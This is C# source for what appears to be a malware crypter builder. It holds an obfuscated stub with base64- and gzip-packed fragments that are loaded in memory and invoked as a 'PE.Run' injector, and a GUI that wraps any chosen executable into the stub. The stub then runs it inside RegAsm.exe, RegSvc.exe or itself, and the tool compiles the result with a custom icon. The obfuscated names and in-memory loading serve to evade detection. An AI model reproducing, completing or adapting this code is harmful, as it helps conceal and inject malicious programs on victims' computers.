    static string ҘрЊ亊難予иуӨӔҼЌふбгуḆsdz = ""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"";

    static string こҘかЦくЏこҍӔяḈооҼふаかь = ""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"";

    static string final = ""u9BbvVydu+LJxff2V+TJjmN+efPyycUE+5SrMr5jx/43wU5DD9OeP3D4cNnP0GO45xy7Xvl1U+aGELXy6CS8Dx/90QiiGOh0bdhe"" + ""779jsKAJwdfEvW+Kl/QuOfz+w8+n6y+fPbty7ffzh+2P/nqef0TPI+/zw/Ib6F1FsJ/+pPIpf/ezy7f7L47pfhsl9dVvk2fY82NY"" + ""q4zyivMvku0vT6+/uLp6fXvzXEccqivfvB7P/vO7qR88uzsGeVk772afkUx6VenX13/3hTvZuU7Us4/NcU6Ia0X/OCnfvKd4af19"" + ""PNXhc7n/8+ep8ffVT2if+f8t+HkgWfnWRX9/PemNZnpW8rHYK3pu/vHyn/lT71GLH8ljV4ecOykSvRHz4+eHz0/euiBN8xO5/HB0"" + ""7h++dHzo+f/Dc//A/KDqLAAWAAA"";

    public static void меь革事革頂四бЉほра六くまいふえか(byte[] сӧはолзӨШくЏдӧωуӨод革もḒ五難, object[] ϟ事もひ革Ӕωлか亊дкЖくϐоϐЊϟӔϐб, string Class, string дздへокЀこмоまϟотḈく与Ḇう頂ҘҼ)
    {
        try
        {
            Assembly ъ五уめきьϐ革оатえ難рおоЀЖḆҶ亊р = Assembly.Load(сӧはолзӨШくЏдӧωуӨод革もḒ五難);
            MethodInfo кгう事くқЏϟかи革ωқώ争四か亊с骨 = ъ五уめきьϐ革оатえ難рおоЀЖḆҶ亊р.GetType(Class).GetMethod(дздへокЀこмоまϟотḈく与Ḇう頂ҘҼ);
            кгう事くқЏϟかи革ωқώ争四か亊с骨.Invoke(null, ϟ事もひ革Ӕωлか亊дкЖくϐоϐЊϟӔϐб);
        }
        catch
        {

        }
    }
    public static void яҼあбЉくФЀ頂Ḓ革くЊо事五аひϟҞЖ(byte[] bytes, string host)
    {
        меь革事革頂四бЉほра六くまいふえか(debase64(бけこг事бдϚҼелълふӧлаб + ҘрЊ亊難予иуӨӔҼЌふбгуḆ + еаϟззуслへсШЀлз難六おу + ҘрЊ亊難予иуӨӔҼЌふбгуḆdz + иきめбҍраかоҼа事争予ҍоくひ + ϟЏめ四ҞӔけя難гмбаӨϚЗШほ + о難ЀЏлḒқЏөаӨ亊өЉШϟこ四 + いうЏз四ひ事Цこмлϐう争Жώб + ϟ事もひ革Ӕωлか亊дкЖくϐоϐЊ + деьллуЖまうөはωЏ与Ḇほえ四 + Џお争Жへほϐϟϐま与ひо与мϟъө + Ầлは亊ЏеḒḆтいЖḈЗкӨЌсҘ + 六кЀлиえеへШう頂дくЉЏ五きб + гώбсひья頂事аおωうлめほ + өいẦЀөώз争қШл頂уҘқл難く + 争еうөЊҘръҶрЏωЉう亊革与е + あЀえгФ四г争か四ЌмЉЏ予ЦЊ四 + у革まө五оЉт頂коШясӔсрは + 亊ϚуЉҍҍいлқЦかеḔбはḒҘは + лбқひЖо事ттҍ五рЊ事五争くほ + ϐо与いもϚ四иめл亊四отя与こま + ҍへясώҞ四うҍқ争四лẦтωく事 + CyberҞうлめаөқ与бこくӨ骨өけḆЗほ + ьзいき骨лбог六иはгあϚглḈ + 四ϐϟひеはҞӨへзЗЦз六Љふう + Ḓは四ЏялҼへогалаϐемう + く難ӔЊяФお五ώかеҼгẦ亊Њоӧ + еягЊог骨ьаけлӔいẦḒФЦ + а頂Ҽ頂гоこел争Жзけб難ЌЌま + Ϛлひ六ҞӧзиаώаьひЀҶг事こ + лこеЖ与ḔいみбьωгяҼьҶмз + ЉмҼこ六ẦほФωаеиほもҞЊϚϟ + ひϐьЖ骨五өえ五ЦみЗЊеуẦϟ与 + ほҞへこϟ難き五ЊほбへはзҼгЖа + くЊөи頂Фг四л与ЊҶもϟ予頂бь + もаӨдб革頂оЖӧ六еьひ骨与еϟ + об難めへъこまблЗзḒбЗ骨Ш事 + Ж与ḔẦзḈẦЀӧ骨ḒώかϟめзЉз + ḒҼいс争я革ҘЊふелへいϚрзр + кмлФдзくсҶ六ӧаこЀуいもひ + ҘлЌьώ予ЉкгрえЊ与みоふは革 + ьеえϐ予лЖьωъгおふФЀьま難 + ひқлЀя五ЉいẦふはЊϚЀбみふз + акほЖϐрひきωлḈ亊はこқаоЖ + б革難гくмЗ難е革難ҞҍбЖ予Љう + ϟогдмҼ五яҘӨへӧЀбḒけбも + аеẦьふс六ьФḈめく四ҼへかḈま + はḈ頂Ҽけ事六бкт事まҍФяҞ予与 + 五ḈみсӔふ与ふаωこまおеいḈうう + こωḆлкЏдいсくздẦЗへоҍЀ + みめоьϚ骨Жбомうあазоほ革а + Ѐい争ллӔоは与ひ骨ω頂予Ш事Ҟこ + 難гтきЊほḆгҘώҶЏϐ予зうоқ + Ҟうлめаөқ与бこくӨ骨өけḆЗほ + ふふгẦт五и頂дқЌこбḔはиώ + ẦもзきбЗめḒẦはẦϐӔгかуҞь + Ҟөе与еӧуҞ予四Ḕ与лмくиаЖ + аъḈ争атът骨суこẦḆもл予も + はъ骨бお事ьḔ事ϟЦこḔあл四うз + かлЗϐωЊЌьḒḆ四слώдҞҍқ + Ḓсяく四ммЊЦъҞここϚьЀ骨г + 骨өглеも争уまЦẦҘр骨くуまб + 骨うъЦаもобЌひみқ亊おけきа争 + こг争ほбФиЏре六бкдЊ予ъ五 + т革Ќҍいгえほқ争Ҽ与Љ争ьうはз + ҶϚ亊ЦḒϟеẦḒく事ЖиώЉҞоз + Ḕへк与уе五гめлẦЉ争争みб五г + 亊もめ四予う難Ḇ与ҘḈωШьҘи革о + оярд骨лはώЦаҍьくлгおео + いώугḒ与Ф事өЗへḆьоこけьу + 骨予бобふ事Љ予亊ほегふḔまЊт + ωωへгЗЀлеЦくоиϟмϟсへみ + ЌШаいくみ予лркみまҼШみくあл + 五ӧЊえӨい六ϟほḒふӧ与раもḒб + Фかほз与めиみдめЗЖаきωЌώϚ + урくкқоẦо五олЌう難ӧЗはい + もЌмひШШ与рӨϚもЀほқиまえл + 亊争икほҍаЖбукьҍめひз四з + ЀこзФЌωҶひяЌまẦもгкきẦま + ЖこҘめаくうωШおеẦこめ六Жсл + こḆӧбъЉуқまеЊώけω頂Џ与ө + Њмо頂кみほаうЀẦみ骨кこḔ亊ϐ + өӔḆЖえώҞ与бḔсЦいЉҍобЏ + лへаббгḈӧ亊ФḔт頂ШみкҘЏ + г骨зこ争ьま頂ḈかӔ頂Жзоқ五も + ҘрЊ亊難予иуӨӔҼЌふбгуḆsdz + こҘかЦくЏこҍӔяḈооҼふаかь + final), new object[] { bytes, host }, ""PE"", ""Run"");
    }
    private static byte[] debase64(string лҍгҼолеҶкḒъсекまа五まлШеϚ)
    {
        return Convert.FromBase64String(итώωまьбきЌӔ頂めд革Љ六争яҞҞсҼ(лҍгҼолеҶкḒъсекまа五まлШеϚ));
    }
    private static string итώωまьбきЌӔ頂めд革Љ六争яҞҞсҼ(string оъЏзϐагくϟいҼқ予оеあ骨まけへ事も)
    {
        byte[] 与рҞうЖьъ骨аもШみほϚЉ頂оъЖい = Convert.FromBase64String(оъЏзϐагくϟいҼқ予оеあ骨まけへ事も);
        MemoryStream ms = new MemoryStream();
        int иḒϐḈгьほḆЦもϟへөқФЀъе予まЦЖ = BitConverter.ToInt32(与рҞうЖьъ骨аもШみほϚЉ頂оъЖい, 0);
        ms.Write(与рҞうЖьъ骨аもШみほϚЉ頂оъЖい, 4, 与рҞうЖьъ骨аもШみほϚЉ頂оъЖい.Length - 4);
        byte[] buffer = new byte[(иḒϐḈгьほḆЦもϟへөқФЀъе予まЦЖ) - 1 + 1];
        ms.Position = 0;
        GZipStream zip = new GZipStream(ms, CompressionMode.Decompress);
        zip.Read(buffer, 0, buffer.Length);
        return Encoding.UTF8.GetString(buffer);
    }

    public static class Program
    {
        static byte[] rawData = {
	   //bytes
       };

        static void Main()
        {
            өϟ事араЌ六лоФ骨予骨я頂ЦЊьеб五зҍ予.яҼあбЉくФЀ頂Ḓ革くЊо事五аひϟҞЖ(rawData, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), ""asidbasid.exe""));
        }
    }

}
";

        private void bunifuLabel1_MouseDown(object sender, MouseEventArgs e)
        {
            Application.Exit();
        }
        public static string SpliceText(string text, int lineLength)
        {
            return Regex.Replace(text, "(.{" + lineLength + "})", "$1" + Environment.NewLine);
        }
        private void guna2Button2_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe|CETRAINER (*.CETRAINER)|*.CETRAINER";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    guna2TextBox1.Text = openFileDialog.FileName;
                }
            }
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            try
            {
                using (var saveFileDialog = new SaveFileDialog())
                {
                    saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        byte[] xd = File.ReadAllBytes(guna2TextBox1.Text);
                        string a = BitConverter.ToString(xd);
                        string b = "0x" + a;
                        var maybe = b.Replace("-", ", 0x");
                        var xdfaskd = SpliceText(maybe, 72);
                        stub = stub.Replace("//bytes", xdfaskd);
                        if (guna2RadioButton1.Checked == true)
                        {
                            stub = stub.Replace("asidbasid.exe", "RegAsm.exe");
                        }
                        if (guna2RadioButton2.Checked == true)
                        {
                            stub = stub.Replace("asidbasid.exe", "RegSvc.exe");
                        }
                       if (guna2RadioButton3.Checked == true)
                        {
                            stub = stub.Replace(@"Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), ""asidbasid.exe"")", "Application.ExecutablePath");
                        }
                        var isOK = Compiler.CompileFromSource(stub, saveFileDialog.FileName, string.IsNullOrWhiteSpace(guna2TextBox2.Text) ? null : guna2TextBox2.Text);
                        

                        if (isOK)
                        {
                            MessageBox.Show("Sealed!");
                            
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Filter = "Icon (*.ico)|*.ico";
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        guna2TextBox2.Text = openFileDialog.FileName;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void guna2Button5_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/DXqp8BnDta");
        }

        private void guna2Button4_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.youtube.com/channel/UCSAj306v3m-1FypMrB6V2Zw");
        }

        private void guna2RadioButton1_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}